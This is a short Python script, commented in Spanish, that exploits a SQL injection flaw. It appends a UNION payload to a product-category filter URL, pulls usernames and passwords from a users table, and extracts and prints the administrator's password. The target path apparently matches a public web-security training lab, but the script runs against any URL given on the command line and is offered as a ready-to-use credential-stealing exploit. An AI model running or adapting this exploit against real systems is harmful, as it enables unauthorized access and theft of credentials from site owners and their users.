import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

# Desactivar advertencias de certificados SSL no seguros
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración de proxies (si es necesario)
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def exploit_sql_user_table(url):
    """Intenta extraer el usuario y la contraseña del administrador mediante inyección SQL."""
    # Datos específicos de la inyección SQL
    username = "administrator"
    path = '/filter?category=Pets'
    sql_payload = "' UNION select NULL,username||'~'||password FROM users--"

    # Realizar la solicitud HTTP con inyección SQL
    r = requests.get(f"{url}{path}{sql_payload}", verify=False, proxies=proxies)
    res = r.text

    # Buscar el nombre de usuario en la respuesta
    if username in res:
        print(f"[+] Se encontró la contraseña del administrador.")
        soup = BeautifulSoup(res, 'html.parser')

        # Utilizar expresión regular para encontrar la contraseña del administrador
        found = soup.find(string=re.compile(f'{username}~([^<]+)'))
        if found:
            admin_password = found.split("~")[1]
            print(f"[+] La contraseña del administrador es {admin_password}")
            return True
        else:
            print("[-] No se encontró la contraseña del administrador en el HTML.")
            return False
    else:
        print("[-] No se encontró el nombre de usuario en la respuesta.")
        return False

def main():
    """Función principal que ejecuta el script."""
    try:
        # Obtener la URL desde la línea de comando
        url = sys.argv[1].strip()
    except IndexError:
        # Manejar el caso en que no se proporciona una URL
        print(f"[-] Uso: {sys.argv[0]} <url>")
        print(f"[-] Ejemplo: {sys.argv[0]} www.ejemplo.com")
        sys.exit(-1)

    print("[+] Extrayendo la lista de usuarios y contraseñas...")
    # Ejecutar la función de explotación
    if not exploit_sql_user_table(url):
        print("[-] No se encontró la contraseña del administrador.")

if __name__ == '__main__':
    main()